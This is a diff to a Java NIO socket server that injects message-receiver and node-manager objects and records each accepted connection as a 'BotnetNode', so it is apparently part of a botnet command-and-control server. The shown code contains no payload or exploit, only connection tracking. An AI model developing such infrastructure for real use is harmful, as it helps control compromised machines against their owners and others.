@@ -17,13 +17,16 @@ public class Server extends Thread {
 
     private static final Logger logger = LogManager.getLogger(Server.class);
     private final int port;
-    private final MessageHandlers messageHandler;
+    private final MessageReceiver messageReceiver;
+    private final NodeManager nodeManager;
     private ServerSocketChannel serverSocketChannel;
     private Selector selector;
 
-    Server(int port) {
+    Server(int port, MessageReceiver messageReceiver,
+           NodeManager nodeManager) {
         this.port = port;
-        this.messageHandler = new MessageHandlers();
+        this.messageReceiver = messageReceiver;
+        this.nodeManager = nodeManager;
     }
 
     @Override
@@ -51,7 +54,7 @@ public class Server extends Thread {
                     }
 
                     if (key.isReadable()) {
-                        messageHandler.handleNewMessage(key.channel());
+                        messageReceiver.handleNewMessage(key.channel());
                     }
 
                     it.remove();
@@ -70,6 +73,11 @@ public class Server extends Thread {
 
     private void handleNewIncomingConnection(Selector selector) throws IOException {
         SocketChannel clientSocket = serverSocketChannel.accept();
+        nodeManager.add(new BotnetNode(
+                clientSocket,
+                (InetSocketAddress) clientSocket.getLocalAddress(),
+                NodeStatus.CONNECTED)
+        );
         clientSocket.configureBlocking(false);
         clientSocket.register(selector, SelectionKey.OP_READ);
         logger.info("new connection established");
